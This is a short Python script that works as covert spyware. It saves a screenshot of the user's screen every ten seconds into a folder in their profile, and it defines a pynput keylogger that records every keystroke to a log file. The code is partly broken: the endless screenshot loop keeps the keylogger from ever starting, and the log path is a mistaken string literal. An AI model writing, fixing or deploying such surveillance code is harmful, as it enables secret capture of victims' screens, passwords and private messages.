from PIL import ImageGrab                                
import random                                               # 
import os                                                   # 
import getpass                                              #
import time
import sys 
from pynput.keyboard import Key, Listener
import logging
user_name = getpass.getuser()                               # 

if not os.path.exists("C:\\Users\\%s\\ssler" % user_name):  
    os.makedirs("C:\\Users\\%s\\ssler" % user_name)         

lokasyon = "C:\\Users\\%s\\ssler\\" % user_name             #

                                                            

while True:
    def ssal():                                             # 
        global lokasyon                                     # 
        photoid = random.randint(10000000, 900000000)       # 
        snapshot = ImageGrab.grab()
        save_path = "%s\\%s.jpg" %(lokasyon, photoid)       # 
        snapshot.save(save_path)
        time.sleep(10)                                      # 
    ssal()


log_dir = "lokasyon"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    
with Listener(on_press=on_press) as listener:
    listener.join()
